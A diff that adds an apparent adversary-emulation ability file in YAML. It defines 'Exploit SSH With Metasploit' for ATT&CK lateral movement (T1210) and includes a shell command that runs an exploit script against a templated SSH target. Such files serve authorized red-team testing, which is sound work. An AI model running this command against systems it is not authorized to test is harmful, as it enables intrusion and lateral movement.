@@ -1,0 +1,19 @@
+---
+
+- id: 69340ef5-1698-42d4-99f4-3381e8ff095b
+  name: Exploit SSH With Metasploit
+  description: Use Metasploit to Exploit an SSH Server
+  tactic: Lateral-Movement
+  technique:
+    attack_id: T1210
+    name: Exploitation of Remote Services
+  platforms:
+    linux:
+      sh:
+        command: |
+          python3 metasploit_exploit_port.py --target #{remote.service.ssh} --server #{server}
+        payload: metasploit_exploit_port.py
+        parser:
+          name: line
+          property: remote.vuln.metasploit
+          script: ''
